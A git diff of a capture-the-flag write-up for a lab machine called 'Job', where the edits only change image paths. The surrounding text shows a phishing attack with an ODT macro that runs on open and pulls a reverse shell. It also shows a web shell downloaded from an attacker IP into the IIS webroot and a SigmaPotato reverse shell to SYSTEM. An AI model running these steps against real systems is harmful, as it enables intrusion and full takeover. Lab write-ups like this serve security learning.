@@ -21,20 +21,20 @@ In the previous NMAP scan, port 80 revealed that the http title was 'Job.local'.
 ```bash
 sudo nano /etc/hosts
 ```
-![Hosts File](/assets/posts/job/hostsfile.png)
+![Hosts File](../assets/posts/job/hostsfile.png)
 
 Browsing to the HTTP server hosted, the index.html file revealed interesting information:
-![HTTP Page1](/assets/posts/job/http1.png)
+![HTTP Page1](../assets/posts/job/http1.png)
 The webpage states an email address 'career@job.local' while hinting at a potential phishing attack vector using libre office.
 
 
 ## Creating a malicious ODT file
 First, I opened libreoffice and pasted Lorem Ipsum in there so the document wasn't empty:
-![Lorem Ipsum](/assets/posts/job/loremjob.png)
+![Lorem Ipsum](../assets/posts/job/loremjob.png)
 
 Browse to tools->macros->organize macro's->basic & create a new macro filename.odt->standard->new
-![Macros](/assets/posts/job/odtmacro1.png)
-![Macro2](/assets/posts/job/odtmacro2.png)
+![Macros](../assets/posts/job/odtmacro1.png)
+![Macro2](../assets/posts/job/odtmacro2.png)
 
 The following code was embedded into the macro to download and execute the reverse shell: 
 ```bash
@@ -47,7 +47,7 @@ End Sub
 
 (NOTE: security.ps1 will be made in the next section).
 It is important that the macro is immediately trigged, to achieve that we can add it to trigger when the document is opened tools->macros->organize macros->basic->select the created macro->assign->events->open document:
-![Macro3](/assets/posts/job/odtmacro3.png)
+![Macro3](../assets/posts/job/odtmacro3.png)
 
 Save the file and we will be ready to move onto creating an obfuscated reverse shell.
 
@@ -81,7 +81,7 @@ sendemail -s "job.local" \
 ```
 
 A short while later, our reverse shell file was downloaded from the web server and the shell was triggered on the machine:
-![Shell](/assets/posts/job/shellproofjack.png)
+![Shell](../assets/posts/job/shellproofjack.png)
 
 ## Switching to IIS Apppool
 Viewing inetpub/wwwroot and checking if it was writable to potentially move into IIS Apppool
@@ -90,7 +90,7 @@ Get-Acl "C:\inetpub\wwwroot" | Format-List
 ```
 
 The output shows that it is writable and it contains a hello.aspx file.
-![inetpub](/assets/posts/job/inetpubenum.png)
+![inetpub](../assets/posts/job/inetpubenum.png)
 ![inetpub2](/assets/posts/job/inetpubenum2.png)
 
 [SharPyShell](https://github.com/antonioCoco/SharPyShell) is a repository containing a script that can generate and interact with an obfuscated aspx file, we can use this to generate a file that can be later interacted with:
@@ -106,20 +106,20 @@ python3 -m http.server 80
 ```bash
 (New-Object Net.WebClient).DownloadFile('http://10.8.4.194:80/shell.aspx','C:\inetpub\wwwroot\shell.aspx')
 ```
-![inetpub3](/assets/posts/job/inetpubenum3.png)
+![inetpub3](../assets/posts/job/inetpubenum3.png)
 
 Following from the shell upload, we can interact with it via sharpyshell again to gain a HTTP interactive shell as IIS Apppool.
 ```bash
 python3 SharPyShell.py interact -u http://job.local/shell.aspx -p somepassword
 ```
-![inetpub4](/assets/posts/job/inetpubenum4.png)
+![inetpub4](../assets/posts/job/inetpubenum4.png)
 
 ## Abusing windows privileges to admin
 Viewing account privileges on the apppool showed that SeImpersonatePrivilege was available:
 ```bash
 whoami /priv
 ```
-![privesc1](/assets/posts/job/privesc1.png)
+![privesc1](../assets/posts/job/privesc1.png)
 
 From here gaining administrator privileges was relatively simple, we can use a potato exploit. In this instance I opted to use SigmaPotato https://github.com/tylerdotrar/SigmaPotato, to use this transfer it from the attacker machine to the host machine using sharpy's webshell.
 ```bash
@@ -131,5 +131,5 @@ SigmaPotato.exe --revshell 10.8.4.194 443
 ```
 
 We eventually receive a callback on the shell as NT authority\system.
-![pwned](/assets/posts/job/pwned.png)
+![pwned](../assets/posts/job/pwned.png)
 PWNED!
